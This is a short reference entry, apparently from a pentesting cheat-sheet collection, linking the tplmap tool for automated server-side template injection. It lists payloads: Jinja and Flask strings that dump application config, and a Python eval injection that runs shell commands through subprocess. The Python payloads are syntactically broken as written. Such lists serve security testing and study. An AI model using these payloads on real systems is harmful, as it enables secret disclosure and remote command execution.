---
title: "tplmap"
description: "Template Injection



Automated server-side template injection


Jinja Injection

{{ config.items() }}


Flask Injection

{{ config }}


Python eval() function

__import__.('subprocess').getoutput('<command>')

make sure to switch the parentheses if it doesn't work


__import__.('subprocess').getoutput('ls').split('\\n')

list files in system




More python injection

"
url: "https://github.com/epinna/tplmap"
category: "Miscellaneous"
---
